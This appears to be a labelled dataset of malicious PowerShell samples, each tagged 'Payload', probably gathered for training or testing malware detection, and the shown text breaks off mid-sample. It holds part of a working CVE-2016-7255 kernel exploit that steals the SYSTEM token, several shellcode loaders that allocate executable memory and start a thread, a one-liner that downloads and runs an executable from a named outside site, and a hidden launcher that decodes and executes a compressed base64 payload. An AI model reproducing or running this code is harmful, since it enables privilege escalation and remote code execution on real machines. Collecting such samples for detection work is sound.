				Write-Verbose ""[+] PowerShell _EPROCESS address: 0x$(""{0:X}"" -f $NextProcess)""
				Write-Verbose ""[+] PID: $NextPID""
				Write-Verbose ""[+] PowerShell Token: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))""
				$PoShTokenAddr = $NextProcess+$TokenOffset
				break
			}
			$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
		}

		Write-Verbose ""`n[!] Duplicating SYSTEM token!`n""

		Bitmap-Write -Address $PoShTokenAddr -Value $SysToken

		""`n[!] Success, spawning a system shell!""
		
		Write-Verbose ""[!] Sending command to the elevated child""
		$pipeWriter.WriteLine($Command)
		$npipeServer.Dispose()	
		
	}

	function Sim-KeyDown {
		param([Int]$wKey)
		$KeyboardInput = New-Object KEYBDINPUT
		$KeyboardInput.dwFlags = 0
		$KeyboardInput.wVk = $wKey

		$InputObject = New-Object INPUT
		$InputObject.itype = 1
		$InputObject.U = $KeyboardInput
		$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
		
		$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
		if ($CallResult -eq 1) {
			$true
		} else {
			$false
		}
	}

	function Sim-KeyUp {
		param([Int]$wKey)
		$KeyboardInput = New-Object KEYBDINPUT
		$KeyboardInput.dwFlags = 2
		$KeyboardInput.wVk = $wKey
		
		$InputObject = New-Object INPUT
		$InputObject.itype = 1
		$InputObject.U = $KeyboardInput
		$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
		
		$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
		if ($CallResult -eq 1) {
			$true
		} else {
			$false
		}
	}

	function Do-AltShiftEsc {
		$CallResult = Sim-KeyDown -wKey 0x12 
		$CallResult = Sim-KeyDown -wKey 0x10 
		$CallResult = Sim-KeyDown -wKey 0x1b 
		$CallResult = Sim-KeyUp -wKey 0x1b   
		$CallResult = Sim-KeyDown -wKey 0x1b 
		$CallResult = Sim-KeyUp -wKey 0x1b   
		$CallResult = Sim-KeyUp -wKey 0x12   
		$CallResult = Sim-KeyUp -wKey 0x10   
	}

	function Do-AltShiftTab {
		param([Int]$Count)
		$CallResult = Sim-KeyDown -wKey 0x12    
		$CallResult = Sim-KeyDown -wKey 0x10    
		for ($i=0;$i -lt $count;$i++) {
			$CallResult = Sim-KeyDown -wKey 0x9 
			$CallResult = Sim-KeyUp -wKey 0x9   
		}
		$CallResult = Sim-KeyUp -wKey 0x12      
		$CallResult = Sim-KeyUp -wKey 0x10      
	}

	do {
		$Bitmap1 = Stage-gSharedInfoBitmap
		$Bitmap2 = Stage-gSharedInfoBitmap
		if ($Bitmap1.BitmapKernelObj -lt $Bitmap2.BitmapKernelObj) {
			$WorkerBitmap = $Bitmap1
			$ManagerBitmap = $Bitmap2
		} else {
			$WorkerBitmap = $Bitmap2
			$ManagerBitmap = $Bitmap1
		}
		$Distance = $ManagerBitmap.BitmapKernelObj - $WorkerBitmap.BitmapKernelObj
	} while ($Distance -ne 0x2000)

	Write-Verbose ""[?] Adjacent large session pool feng shui..""
	Write-Verbose ""[+] Worker  : $('{0:X}' -f $WorkerBitmap.BitmapKernelObj)""
	Write-Verbose ""[+] Manager : $('{0:X}' -f $ManagerBitmap.BitmapKernelObj)""
	Write-Verbose ""[+] Distance: 0x$('{0:X}' -f $Distance)""

	$TargetAddress = $WorkerBitmap.BitmapKernelObj + 63

	function Do-OrAddress {
		param([Int64]$Address)

		$AtomCreate = New-Object ms16135
		$hAtom = $AtomCreate.CustomClass(""cve-2016-7255"")
		if ($hAtom -eq 0){
			break
		}

		Write-Verbose ""`n[?] Creating Window objects""
		$hMod = [ms16135]::GetModuleHandleW([String]::Empty)
		$hWndParent = [ms16135]::CreateWindowExW(0,""cve-2016-7255"",[String]::Empty,0x10CF0000,0,0,360,360,[IntPtr]::Zero,[IntPtr]::Zero,$hMod,[IntPtr]::Zero)
		if ($hWndParent -eq 0){
			break
		}

		$hWndChild = [ms16135]::CreateWindowExW(0,""cve-2016-7255"",""cve-2016-7255"",0x50CF0000,0,0,160,160,$hWndParent,[IntPtr]::Zero,$hMod,[IntPtr]::Zero)
		if ($hWndChild -eq 0){
			break
		}

		$Address = $Address - 0x28

		Write-Verbose ""[+] Corrupting child window spmenu""
		$CallResult = [ms16135]::SetWindowLongPtr($hWndChild,-12,[IntPtr]$Address)

		$CallResult = [ms16135]::ShowWindow($hWndParent,1)
		$hDesktopWindow = [ms16135]::GetDesktopWindow()
		$CallResult = [ms16135]::SetParent($hWndChild,$hDesktopWindow)
		$CallResult = [ms16135]::SetForegroundWindow($hWndChild)

		Do-AltShiftTab -Count 4

		$CallResult = [ms16135]::SwitchToThisWindow($hWndChild,$true)

		Do-AltShiftEsc

		function Trigger-Write {
			$SafeGuard = [diagnostics.stopwatch]::StartNew()
			while ($SafeGuard.ElapsedMilliseconds -lt 3000) {
				$tagMSG = New-Object tagMSG
				if ($([ms16135]::GetMessage([ref]$tagMSG,[IntPtr]::Zero,0,0))) {
					$CallResult = [ms16135]::SetFocus($hWndParent) 
					for ($i=0;$i-lt20;$i++){Do-AltShiftEsc}        
					$CallResult = [ms16135]::SetFocus($hWndChild)  
					for ($i=0;$i-lt20;$i++){Do-AltShiftEsc}        
					$CallResult = [ms16135]::TranslateMessage([ref]$tagMSG)
					$CallResult = [ms16135]::DispatchMessage([ref]$tagMSG)
				}
			} $SafeGuard.Stop()
		}
		[IntPtr]$Global:BytePointer = [ms16135]::VirtualAlloc([System.IntPtr]::Zero, 0x2000, 0x3000, 0x40)
		do {
			Write-Verbose ""[+] Trying to trigger arbitrary 'Or'..""
			$ByteRead = [ms16135]::GetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)
			Trigger-Write
			$LoopCount += 1
		} while ($ByteRead -ne 0x2000 -And $LoopCount -lt 10)

		$CallResult = [ms16135]::DestroyWindow($hWndChild)
		$CallResult = [ms16135]::DestroyWindow($hWndParent)
		$CallResult = [ms16135]::UnregisterClass(""cve-2016-7255"",[IntPtr]::Zero)
		
		if ($LoopCount -eq 10) {
			""`n[!] Bug did not trigger, try again or patched?`n""
			$Script:BugNotTriggered = 1
		}
	}

	Do-OrAddress -Address $TargetAddress
	if ($BugNotTriggered) {
		Return
	}

	if ($OSMajorMinor -eq ""6.1"") {
		$SizeVal = 0x400000770
	} else {
		$SizeVal = 0x400000760
	}
	do {
		$Read64 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount)
		if ($Read64 -eq $SizeVal) {
			$Pointer1 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 16)
			$Pointer2 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 24)
			if ($Pointer1 -eq $Pointer2) {
				$BufferOffset = $LoopCount + 16
				Break
			}
		}
		$LoopCount += 8
	} while ($LoopCount -lt 0x2000)
	$pvBits = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset)
	$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)

	if ($pvScan0 -ne 0) {
		Write-Verbose ""`n[?] Success, reading beyond worker bitmap size!""
		Write-Verbose ""[+] Old manager bitmap pvScan0: $('{0:X}' -f $pvScan0)""
	} else {
		""`n[!] Buffer contains invalid data, quitting..`n""
		Return
	}

	[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset),$WorkerBitmap.BitmappvScan0)
	[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset + 8),$WorkerBitmap.BitmappvScan0)
	$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)
	Write-Verbose ""[+] New manager bitmap pvScan0: $('{0:X}' -f $pvScan0)""

	$CallResult = [ms16135]::SetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)

	Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle
}
",Payload
dd1728e4fa2b43828d367ec0119cf073a4e6acbd60f339aeca036bf6cf81a90a,"
$7ge0 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $7ge0 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xc3,0x87,0x45,0x98,0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xc2,0x04,0x03,0x5a,0xcc,0x65,0xb0,0x64,0x3a,0xeb,0x3b,0x95,0xba,0x8c,0xb2,0x70,0x8b,0x8c,0xa1,0xf1,0xbb,0x3c,0xa1,0x54,0x37,0xb6,0xe7,0x4c,0xcc,0xba,0x2f,0x62,0x65,0x70,0x16,0x4d,0x76,0x29,0x6a,0xcc,0xf4,0x30,0xbf,0x2e,0xc5,0xfa,0xb2,0x2f,0x02,0xe6,0x3f,0x7d,0xdb,0x6c,0xed,0x92,0x68,0x38,0x2e,0x18,0x22,0xac,0x36,0xfd,0xf2,0xcf,0x17,0x50,0x89,0x89,0xb7,0x52,0x5e,0xa2,0xf1,0x4c,0x83,0x8f,0x48,0xe6,0x77,0x7b,0x4b,0x2e,0x46,0x84,0xe0,0x0f,0x67,0x77,0xf8,0x48,0x4f,0x68,0x8f,0xa0,0xac,0x15,0x88,0x76,0xcf,0xc1,0x1d,0x6d,0x77,0x81,0x86,0x49,0x86,0x46,0x50,0x19,0x84,0x23,0x16,0x45,0x88,0xb2,0xfb,0xfd,0xb4,0x3f,0xfa,0xd1,0x3d,0x7b,0xd9,0xf5,0x66,0xdf,0x40,0xaf,0xc2,0x8e,0x7d,0xaf,0xad,0x6f,0xd8,0xbb,0x43,0x7b,0x51,0xe6,0x0b,0x48,0x58,0x19,0xcb,0xc6,0xeb,0x6a,0xf9,0x49,0x40,0xe5,0xb1,0x02,0x4e,0xf2,0xb6,0x38,0x36,0x6c,0x49,0xc3,0x47,0xa4,0x8d,0x97,0x17,0xde,0x24,0x98,0xf3,0x1e,0xc9,0x4d,0x69,0x1a,0x5d,0xae,0xc6,0x25,0xf1,0x46,0x15,0x26,0x08,0x2a,0x90,0xc0,0x5a,0x04,0xf3,0x5c,0x1a,0xf4,0xb3,0x0c,0xf2,0x1e,0x3c,0x72,0xe2,0x20,0x96,0x1b,0x88,0xce,0x4f,0x73,0x24,0x76,0xca,0x0f,0xd5,0x77,0xc0,0x75,0xd5,0xfc,0xe7,0x8a,0x9b,0xf4,0x82,0x98,0x4b,0xf5,0xd8,0xc3,0xdd,0x0a,0xf7,0x6e,0xe1,0x9e,0xfc,0x38,0xb6,0x36,0xff,0x1d,0xf0,0x98,0x00,0x48,0x8b,0x11,0x95,0x33,0xe3,0x5d,0x79,0xb4,0xf3,0x0b,0x13,0xb4,0x9b,0xeb,0x47,0xe7,0xbe,0xf3,0x5d,0x9b,0x13,0x66,0x5e,0xca,0xc0,0x21,0x36,0xf0,0x3f,0x05,0x99,0x0b,0x6a,0x97,0xe5,0xdd,0x52,0xed,0x07,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Ysq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Ysq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Ysq,0,0,0);for (;;){Start-sleep 60};

",Payload
85704865ab8719ff4bdc35d8f79a0e3c32f4c9af7246d2e9aa3ff462c930c5e3,"
$a7b = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $a7b -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x6b,0x32,0xd6,0x19,0xd9,0xcc,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x03,0x7a,0x13,0x83,0xea,0x97,0xd0,0x23,0xe5,0x8f,0x97,0xcc,0x16,0x4f,0xf8,0x45,0xf3,0x7e,0x38,0x31,0x77,0xd0,0x88,0x31,0xd5,0xdc,0x63,0x17,0xce,0x57,0x01,0xb0,0xe1,0xd0,0xac,0xe6,0xcc,0xe1,0x9d,0xdb,0x4f,0x61,0xdc,0x0f,0xb0,0x58,0x2f,0x42,0xb1,0x9d,0x52,0xaf,0xe3,0x76,0x18,0x02,0x14,0xf3,0x54,0x9f,0x9f,0x4f,0x78,0xa7,0x7c,0x07,0x7b,0x86,0xd2,0x1c,0x22,0x08,0xd4,0xf1,0x5e,0x01,0xce,0x16,0x5a,0xdb,0x65,0xec,0x10,0xda,0xaf,0x3d,0xd8,0x71,0x8e,0xf2,0x2b,0x8b,0xd6,0x34,0xd4,0xfe,0x2e,0x47,0x69,0xf9,0xf4,0x3a,0xb5,0x8c,0xee,0x9c,0x3e,0x36,0xcb,0x1d,0x92,0xa1,0x98,0x11,0x5f,0xa5,0xc7,0x35,0x5e,0x6a,0x7c,0x41,0xeb,0x8d,0x53,0xc0,0xaf,0xa9,0x77,0x89,0x74,0xd3,0x2e,0x77,0xda,0xec,0x31,0xd8,0x83,0x48,0x39,0xf4,0xd0,0xe0,0x60,0x90,0x15,0xc9,0x9a,0x60,0x32,0x5a,0xe8,0x52,0x9d,0xf0,0x66,0xde,0x56,0xdf,0x71,0x21,0x4d,0xa7,0xee,0xdc,0x6e,0xd8,0x27,0x1a,0x3a,0x88,0x5f,0x8b,0x43,0x43,0xa0,0x34,0x96,0xfe,0xa5,0xa2,0xd9,0x57,0xa4,0x5f,0xb2,0xa5,0xa7,0x80,0xd2,0x23,0x41,0xee,0x82,0x63,0xde,0x4e,0x73,0xc4,0x8e,0x26,0x99,0xcb,0xf1,0x56,0xa2,0x01,0x9a,0xfc,0x4d,0xfc,0xf2,0x68,0xf7,0xa5,0x89,0x09,0xf8,0x73,0xf4,0x09,0x72,0x70,0x08,0xc7,0x73,0xfd,0x1a,0xbf,0x73,0x48,0x40,0x69,0x8b,0x66,0xef,0x95,0x19,0x8d,0xa6,0xc2,0xb5,0x8f,0x9f,0x24,0x1a,0x6f,0xca,0x3f,0x93,0xe5,0xb5,0x57,0xdc,0xe9,0x35,0xa7,0x8a,0x63,0x36,0xcf,0x6a,0xd0,0x65,0xea,0x74,0xcd,0x19,0xa7,0xe0,0xee,0x4b,0x14,0xa2,0x86,0x71,0x43,0x84,0x08,0x89,0xa6,0x14,0x74,0x5c,0x8e,0x62,0x94,0x5c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PtvX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PtvX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PtvX,0,0,0);for (;;){Start-sleep 60};

",Payload
5c7605af93fc509e4bbdb44f82bf3f7bfa09a35e94bc828a80b02522f4dc0491,"
(New-Object System.Net.WebClient).DownloadFile('http://www.matrimonioadvisor.it/pariglia.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
43317eb192777240d2d6371ca6d4d738b051874fb8dd5a70bd3566e5fc3b5c4f,"
$yzVT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $yzVT -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x95,0x6d,0xb7,0x5c,0xdb,0xc4,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x9a,0x8f,0x42,0xa0,0x4c,0xcd,0xad,0x59,0x8c,0xb2,0x24,0xbc,0xbd,0xf2,0x53,0xb4,0xed,0xc2,0x10,0x98,0x01,0xa8,0x75,0x09,0x92,0xdc,0x51,0x3e,0x13,0x6a,0x84,0x71,0xa4,0xc7,0xf4,0x10,0x26,0x1a,0x29,0xf3,0x17,0xd5,0x3c,0xf2,0x50,0x08,0xcc,0xa6,0x09,0x46,0x63,0x57,0x3e,0x12,0xb8,0xdc,0x0c,0xb2,0xb8,0x01,0xc4,0xb5,0xe9,0x97,0x5f,0xec,0x29,0x19,0x8c,0x84,0x63,0x01,0xd1,0xa1,0x3a,0xba,0x21,0x5d,0xbd,0x6a,0x78,0x9e,0x12,0x53,0xb5,0x6d,0x6a,0x93,0x71,0x8e,0x19,0xed,0x82,0x33,0x1a,0x2a,0xf9,0xef,0xaf,0xa9,0x59,0x7b,0x17,0x16,0x58,0xa8,0xce,0xdd,0x56,0x05,0x84,0xba,0x7a,0x98,0x49,0xb1,0x86,0x11,0x6c,0x16,0x0f,0x61,0x4b,0xb2,0x54,0x31,0xf2,0xe3,0x30,0x94,0x0b,0xf3,0x9b,0x49,0xae,0x7f,0x31,0x9d,0xc3,0xdd,0x5d,0x52,0xee,0xdd,0x9d,0xfc,0x79,0xad,0xaf,0xa3,0xd1,0x39,0x83,0x2c,0xfc,0xbe,0xe4,0x06,0xb8,0x51,0x1b,0xa9,0xb9,0x78,0xdf,0xfd,0xe9,0x12,0xf6,0x7d,0x62,0xe3,0xf7,0xab,0x1f,0xe6,0x6f,0x94,0x48,0xe9,0x42,0x7c,0x8b,0xea,0x9d,0xc7,0x02,0x0c,0xcd,0x67,0x45,0x81,0xad,0xd7,0x25,0x71,0x45,0x32,0xaa,0xae,0x75,0x3d,0x60,0xc7,0x1f,0xd2,0xdd,0xbf,0xb7,0x4b,0x44,0x4b,0x26,0x93,0x52,0x31,0x68,0x1f,0x51,0xc5,0x26,0xe8,0x1c,0xd5,0xde,0x18,0x6b,0x87,0x48,0x26,0x41,0xa2,0x74,0xb2,0x6e,0x65,0x23,0x2a,0x6d,0x50,0x03,0xf5,0x8e,0xb7,0x18,0x3c,0x1b,0x78,0x76,0x41,0xcb,0x78,0x86,0x17,0x81,0x78,0xee,0xcf,0xf1,0x2a,0x0b,0x10,0x2c,0x5f,0x80,0x85,0xcf,0x36,0x75,0x0d,0xb8,0xb4,0xa0,0x79,0x67,0x46,0x87,0x7b,0x5b,0x91,0xe1,0x09,0xb5,0x21;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$h4b=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($h4b.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$h4b,0,0,0);for (;;){Start-sleep 60};

",Payload
913f0880a8d8f72ab93618914ac48a03129530a504b17e4cbb423d09beddc043,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAExcRlcCA7VW/2/aOhD/uZP2P0QTUhI9yveua6VJzwFS0hIKDYQCQ5NJnOBiEuo4FNjb//4ukKxU66a+SS8iwvbd2Xef+5wvXhw4goaBxK8MvX8vfXv/7qSLOV5KSo7dfvo60PJSzhF2hd9Xzk2qnpyAQs4f6/ZsLn2WlAlarRrhEtNgenlZjzkngTjMC1dEoCgiyxmjJFJU6R9pOCecnN7OHogjpG9S7mvhioUzzFK1bR07cyKdosBNZO3QwYlrBWvFqFDkL19kdXJanhaajzFmkSJb20iQZcFlTFal72pyYH+7IopsUoeHUeiJwpAG1UphEETYIx3YbU1MIuahG8kqxAE/TkTMAymNKNnioKDIMOzy0EGuy0kE+gUjWIcLouSCmLG89LcySc+/iwNBlwTkgvBwZRG+pg6JCi0cuIzcEW+qdMhTFvZbjZRjI9DqCq7mISmvOmqGbszIwVZWf3Y1TaUKz8t0Agrf3797/87LaOBF1a9t48I0jpkAo5PJfkzAW6UbRnSv/Fkq5SUTTsUi5FuY5vo8JupUmiR5mEynUo7ekfajfpP/9RblTB+0SbMzg6WJHVJ3CiZpknKz1nKz3bY6t3Ei/TXlGsSjAWlsA7ykTsYq5TX4icfIPuJCptYB1xQ5FRC3QRjxsUjgzEuTn82aSyp+2GoxZS7hyIEURuAVZFd96cwhQ4psBCZZAliHuQzZ8IDLJNNO+bvNTk/moCTXGY6ivNSNoZicvGQRzIibl1AQ0VSEYhHuh/Kzu2bMBHVwJLLtpupLNNNT62EQCR47kEVAoG+tiEMxSwDJSy3qEm1rUT87XX4VjjpmjAY+7LSGdMBKAoMlEm5wcDTjgVqwiDCWK0aWoLYvb51hH4o5LYg9n7BPXPl1VzPSHxieQJNhcuQo5NtiochLNuUC7ooE5oRaf+zH0UVx5FGdkzRFSlZHE20rEuLn/FplEFVJQtcUrD00XAAsOg+XGo7Ix5olOICmfCje0jqCZ2QEzHS0BS2jJ1o2THgHtGqEjXP35vqhVeSNzdxDRmSYrW6j12rV1teWXRNW0xA3XUOYzfuHBwu17gYjMTZQq09Li1Ftt7qmO6uN3NGm+HGn7Z5K2mb34LveqOF5/rln3ZXPdNoe1ntaqYLbjWbcHmpPWqkWNelTq0cHvcW1LmYjm+GBV/TvyxeYbtr8wS6H5s5A6GpedXbXnn01N93tqFW8GNYWqIlQPWjauhbejDSOukV7oGu9QVPr9WDto1/0arDG/ponYSOzj8qdh1H5tj8odejZYnx1tmsvz5iLtNFQn//Ri67o6qZhIfCn3dM2j5qthchHNDaCJZ5rQ7tCx6v7uznIdQjTLJZqhks24af2kNrroo197VHTx/cYtcdbvVgsj6IKXsAeGjisjx8h7tFK7zKw7w8qIbJZ51m312rcOOPyeWR+/pAQCBiUW0fIJmczs0aPWPGrPmBiHs0xA7bA9Z6Vrx5yPb2ouyFNLBQl7dsLwgPCoNdBN8xojxgLnaRpPF/q0LUOvWQKVTyAYbXy6kiVfiiqz/0kW7q8HIOzUE0pywttEvhini9tqqUStITSplaCqN8eYz1cbZVst3zSVY7QOjqH7c9Rk0rL+Rf3pf8byLTC5/DnvgnI57XfSN8Ebil/DMFPwpcL/wnsP8BhiKkAXQsuK0YOnfQ3cKQUOvoOSXIF7PDSJ/kWvI3FaQc+T/4FGKzG+YEKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
25a2d8baa25c9eafd3adfaa07e45624d3b95bb195ed2c138ca0d425ec92ea43d,"function Invoke-RunAs {

    [CmdletBinding()]Param (
    [Parameter(
        ValueFromPipeline=$True)]
        [String]$username,
    [Parameter(
        ValueFromPipeline=$True)]
        [String]$password,
    [Parameter(
        ValueFromPipeline=$True)]
        [String]$domain,
    [Parameter(
        ValueFromPipeline=$True)]
        [String]$cmd,
    [Parameter()]
        [String]$Arguments,
    [Parameter()]
        [Switch]$ShowWindow
    )
    PROCESS {
        try{
            $startinfo = new-object System.Diagnostics.ProcessStartInfo

            $startinfo.FileName = $cmd
            $startinfo.UseShellExecute = $false

            if(-not ($ShowWindow)) {
                $startinfo.CreateNoWindow = $True
                $startinfo.WindowStyle = ""Hidden""
            }

            if($Arguments) {
                $startinfo.Arguments = $Arguments
            }

            if($UserName) {
                
                $startinfo.UserName = $username
                $sec_password = convertto-securestring $password -asplaintext -force
                $startinfo.Password = $sec_password
                $startinfo.Domain = $domain
            }
            
            [System.Diagnostics.Process]::Start($startinfo) | out-string
        }
        catch {
            ""[!] Error in runas: $_""
        }

    }
}
",Payload
1736313c8e9b5c53e7f415744a1508c2196db31776d98971da4e020eb4f98bb6,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xf0,0xd7,0xc7,0xa7,0xda,0xd6,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x50,0x13,0x83,0xe8,0xfc,0x03,0x50,0xff,0x35,0x32,0x5b,0x17,0x3b,0xbd,0xa4,0xe7,0x5c,0x37,0x41,0xd6,0x5c,0x23,0x01,0x48,0x6d,0x27,0x47,0x64,0x06,0x65,0x7c,0xff,0x6a,0xa2,0x73,0x48,0xc0,0x94,0xba,0x49,0x79,0xe4,0xdd,0xc9,0x80,0x39,0x3e,0xf0,0x4a,0x4c,0x3f,0x35,0xb6,0xbd,0x6d,0xee,0xbc,0x10,0x82,0x9b,0x89,0xa8,0x29,0xd7,0x1c,0xa9,0xce,0xaf,0x1f,0x98,0x40,0xa4,0x79,0x3a,0x62,0x69,0xf2,0x73,0x7c,0x6e,0x3f,0xcd,0xf7,0x44,0xcb,0xcc,0xd1,0x95,0x34,0x62,0x1c,0x1a,0xc7,0x7a,0x58,0x9c,0x38,0x09,0x90,0xdf,0xc5,0x0a,0x67,0xa2,0x11,0x9e,0x7c,0x04,0xd1,0x38,0x59,0xb5,0x36,0xde,0x2a,0xb9,0xf3,0x94,0x75,0xdd,0x02,0x78,0x0e,0xd9,0x8f,0x7f,0xc1,0x68,0xcb,0x5b,0xc5,0x31,0x8f,0xc2,0x5c,0x9f,0x7e,0xfa,0xbf,0x40,0xde,0x5e,0xcb,0x6c,0x0b,0xd3,0x96,0xf8,0xf8,0xde,0x28,0xf8,0x96,0x69,0x5a,0xca,0x39,0xc2,0xf4,0x66,0xb1,0xcc,0x03,0x89,0xe8,0xa9,0x9c,0x74,0x13,0xca,0xb5,0xb2,0x47,0x9a,0xad,0x13,0xe8,0x71,0x2e,0x9c,0x3d,0xef,0x2b,0x0a,0x00,0x70,0xf9,0x5c,0x14,0x73,0xfe,0x7f,0x7f,0xfa,0x18,0x2f,0x2f,0xad,0xb4,0x8f,0x9f,0x0d,0x65,0x67,0xca,0x81,0x5a,0x97,0xf5,0x4b,0xf3,0x3d,0x1a,0x22,0xab,0xa9,0x83,0x6f,0x27,0x48,0x4b,0xba,0x4d,0x4a,0xc7,0x49,0xb1,0x04,0x20,0x27,0xa1,0xf0,0xc0,0x72,0x9b,0x56,0xde,0xa8,0xb6,0x56,0x4a,0x57,0x11,0x01,0xe2,0x55,0x44,0x65,0xad,0xa6,0xa3,0xfe,0x64,0x33,0x0c,0x68,0x89,0xd3,0x8c,0x68,0xdf,0xb9,0x8c,0x00,0x87,0x99,0xde,0x35,0xc8,0x37,0x73,0xe6,0x5d,0xb8,0x22,0x5b,0xf5,0xd0,0xc8,0x82,0x31,0x7f,0x32,0xe1,0xc3,0x43,0xe5,0xcf,0xb1,0xad,0x35;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7ab4e1f913a3538a4984850c5ab503f6a817ae4e23bebf036273742658f4734a,"
$v = '$R = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest,uint src,uint count);'';$J = Add-Type -memberDefinition $R -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]] 